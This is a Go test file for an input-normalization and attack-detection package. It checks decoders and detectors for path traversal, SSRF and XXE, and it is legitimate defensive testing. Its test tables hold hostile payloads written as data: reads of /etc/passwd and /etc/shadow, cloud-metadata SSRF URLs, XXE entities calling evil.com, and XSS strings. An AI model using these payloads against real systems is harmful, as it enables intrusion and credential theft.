package normalize

import (
	"context"
	"net"
	"testing"
)

func TestPercentDecode(t *testing.T) {
	tests := []struct {
		input string
		want  string
	}{
		{"hello", "hello"},
		{"%48%65%6c%6c%6f", "Hello"},
		{"%2Fetc%2Fpasswd", "/etc/passwd"},
		{"hello+world", "hello world"},
		{"%ZZ", "%ZZ"},
		{"%2", "%2"},
		{"%%20", "% "},
	}
	for _, tt := range tests {
		got := percentDecode(tt.input)
		if got != tt.want {
			t.Errorf("percentDecode(%q) = %q, want %q", tt.input, got, tt.want)
		}
	}
}

func TestUnicodePercentDecode(t *testing.T) {
	tests := []struct {
		input string
		want  string
	}{
		{"%u0041", "A"},
		{"%u003C", "<"},
		{"%u4E2D", "\u4E2D"},
		{"normal", "normal"},
		{"%uZZZZ", "%uZZZZ"},
	}
	for _, tt := range tests {
		got := unicodePercentDecode(tt.input)
		if got != tt.want {
			t.Errorf("unicodePercentDecode(%q) = %q, want %q", tt.input, got, tt.want)
		}
	}
}

func TestDecodeURL_MultiLayer(t *testing.T) {
	tests := []struct {
		input string
		want  string
	}{
		{"%252F", "/"},
		{"%25252F", "/"},
		{"%2575%256e%2569%256f%256e", "union"},
		{"%u0025%u0032%u0046", "/"},
		{"0x2F", "/"},
	}
	for _, tt := range tests {
		got := DecodeURL(tt.input)
		if got != tt.want {
			t.Errorf("DecodeURL(%q) = %q, want %q", tt.input, got, tt.want)
		}
	}
}

func TestDecodeHTMLEntities(t *testing.T) {
	tests := []struct {
		input string
		want  string
	}{
		{"&amp;", "&"},
		{"&lt;script&gt;", "<script>"},
		{"&#60;script&#62;", "<script>"},
		{"&#x3c;script&#x3e;", "<script>"},
		{"&quot;hello&quot;", "\"hello\""},
		{"&unknown;", "&unknown;"},
		{"no entities", "no entities"},
		{"&amp;amp;", "&amp;"},
	}
	for _, tt := range tests {
		got := DecodeHTMLEntities(tt.input)
		if got != tt.want {
			t.Errorf("DecodeHTMLEntities(%q) = %q, want %q", tt.input, got, tt.want)
		}
	}
}

func TestNormalizeUnicode(t *testing.T) {
	tests := []struct {
		input string
		want  string
	}{
		{"hello", "hello"},
		{"\uFF21\uFF22\uFF23", "ABC"},
		{"\u2160", "I"},
		{"caf\u00e9", "caf\u00e9"},
	}
	for _, tt := range tests {
		got := NormalizeUnicode(tt.input)
		if got != tt.want {
			t.Errorf("NormalizeUnicode(%q) = %q, want %q", tt.input, got, tt.want)
		}
	}
}

func TestStripZeroWidth(t *testing.T) {
	tests := []struct {
		input string
		want  string
	}{
		{"hello\u200Bworld", "helloworld"},
		{"\uFEFFBOM", "BOM"},
		{"\u200D\u200C", ""},
		{"normal", "normal"},
	}
	for _, tt := range tests {
		got := StripZeroWidth(tt.input)
		if got != tt.want {
			t.Errorf("StripZeroWidth(%q) = %q, want %q", tt.input, got, tt.want)
		}
	}
}

func TestCollapseWhitespace(t *testing.T) {
	tests := []struct {
		input string
		want  string
	}{
		{"hello   world", "hello world"},
		{"  leading", " leading"},
		{"a\t\nb", "a b"},
		{"", ""},
	}
	for _, tt := range tests {
		got := CollapseWhitespace(tt.input)
		if got != tt.want {
			t.Errorf("CollapseWhitespace(%q) = %q, want %q", tt.input, got, tt.want)
		}
	}
}

func TestPipelineNormalize(t *testing.T) {
	p := New(DefaultLimits())

	tests := []struct {
		input    string
		source   Source
		wantNorm string
	}{
		{"%3Cscript%3E", SourceQuery, "<script>"},
		{"&lt;script&gt;", SourceForm, "<script>"},
		{"%25253Cscript%25253E", SourceQuery, "<script>"},
		{"%u003cscript%u003e", SourceQuery, "<script>"},
		{"\uFF1Cscript\uFF1E", SourceBody, "<script>"},
		{"  SELECT   1  ", SourceQuery, " SELECT 1 "},
	}
	for _, tt := range tests {
		v := p.Normalize(tt.input, tt.source)
		if v.Normalized != tt.wantNorm {
			t.Errorf("Normalize(%q) = %q, want %q (rounds=%d)", tt.input, v.Normalized, tt.wantNorm, v.Rounds)
		}
		if v.Source != tt.source {
			t.Errorf("Normalize(%q) source = %v, want %v", tt.input, v.Source, tt.source)
		}
	}
}

func TestPipelineTruncation(t *testing.T) {
	p := New(Limits{MaxDecodeRounds: 3, MaxOutputBytes: 10})
	v := p.Normalize("aaaaaaaaaaaaaaaaaaaa", SourceQuery)
	if !v.Truncated {
		t.Error("expected truncation")
	}
	if len(v.Normalized) != 10 {
		t.Errorf("expected length 10, got %d", len(v.Normalized))
	}
}

func TestPathTraversal(t *testing.T) {
	tests := []struct {
		input string
		want  bool
	}{
		{"../../../etc/passwd", true},
		{"..\\..\\windows\\system32", true},
		{"/etc/shadow", true},
		{"/proc/self/environ", true},
		{"C:\\Windows\\System32", true},
		{"file:///etc/passwd", true},
		{"php://filter/read=convert.base64-encode/resource=/etc/passwd", true},
		{"normal/path/file.txt", false},
		{"images/logo.png", false},
		{"api/v1/users", false},
		{"\x00../etc/passwd", true},
		{"\\\\server\\share", true},
	}
	for _, tt := range tests {
		p := New(DefaultLimits())
		normalized := p.Normalize(tt.input, SourcePath)
		r := DetectPathTraversal(normalized.Normalized)
		if r.Detected != tt.want {
			t.Errorf("DetectPathTraversal(%q) = %v, want %v (detail: %s)", tt.input, r.Detected, tt.want, r.Detail)
		}
	}
}

func TestSSRF(t *testing.T) {
	tests := []struct {
		input string
		want  bool
		risk  SSRFRisk
	}{
		{"http://169.254.169.254/latest/meta-data/", true, SSRFRiskCritical},
		{"http://metadata.google.internal/computeMetadata/v1/", true, SSRFRiskCritical},
		{"http://100.100.100.200/latest/meta-data/", true, SSRFRiskCritical},
		{"http://127.0.0.1:8080/admin", true, SSRFRiskHigh},
		{"http://[::ffff:127.0.0.1]:8080/admin", true, SSRFRiskHigh},
		{"http://[::ffff:169.254.169.254]/latest/meta-data/", true, SSRFRiskCritical},
		{"http://localhost:3000/api", true, SSRFRiskHigh},
		{"http://10.0.0.1/internal", true, SSRFRiskMedium},
		{"http://192.168.1.1/router", true, SSRFRiskMedium},
		{"gopher://attacker.com:25/", true, SSRFRiskHigh},
		{"file:///etc/passwd", true, SSRFRiskHigh},
		{"http://0x7f000001/", true, SSRFRiskHigh},
		{"https://example.com/api", false, SSRFRiskNone},
		{"https://api.github.com/repos", false, SSRFRiskNone},
	}
	for _, tt := range tests {
		p := New(DefaultLimits())
		normalized := p.Normalize(tt.input, SourceBody)
		r := DetectSSRF(normalized.Normalized)
		if r.Detected != tt.want {
			t.Errorf("DetectSSRF(%q) = %v, want %v (detail: %s)", tt.input, r.Detected, tt.want, r.Detail)
		}
		if r.Detected && r.Risk != tt.risk {
			t.Errorf("DetectSSRF(%q) risk = %d, want %d", tt.input, r.Risk, tt.risk)
		}
	}
}

func TestSSRFChecksResolvedHostname(t *testing.T) {
	result := DetectSSRFWithResolver(context.Background(), "https://cdn.example.test/assets", func(context.Context, string) ([]net.IP, error) {
		return []net.IP{net.ParseIP("169.254.169.254"), net.ParseIP("203.0.113.10")}, nil
	})
	if !result.Detected || result.Risk != SSRFRiskHigh {
		t.Fatalf("resolved private address was not detected: %#v", result)
	}
}

func TestXXE(t *testing.T) {
	tests := []struct {
		input string
		want  bool
	}{
		{`<!DOCTYPE foo SYSTEM "http://evil.com/xxe.dtd">`, true},
		{`<!ENTITY xxe SYSTEM "file:///etc/passwd">`, true},
		{`<!ENTITY xxe PUBLIC "-//OASIS//DTD" "http://evil.com/xxe">`, true},
		{`<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="file:///etc/passwd"/>`, true},
		{`<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">]>`, true},
		{`<root><data>hello</data></root>`, false},
		{`{"key": "value"}`, false},
		{`normal text content`, false},
	}
	for _, tt := range tests {
		p := New(DefaultLimits())
		normalized := p.Normalize(tt.input, SourceBody)
		r := DetectXXE(normalized.Normalized)
		if r.Detected != tt.want {
			t.Errorf("DetectXXE(%q) = %v, want %v (detail: %s)", tt.input, r.Detected, tt.want, r.Detail)
		}
	}
}

func BenchmarkPipelineNormalize(b *testing.B) {
	p := New(DefaultLimits())
	inputs := []string{
		"SELECT * FROM users WHERE id=1",
		"%3Cscript%3Ealert(1)%3C/script%3E",
		"../../../etc/passwd",
		"normal request parameter value",
		"&lt;img src=x onerror=alert(1)&gt;",
	}
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		for _, input := range inputs {
			p.Normalize(input, SourceQuery)
		}
	}
}
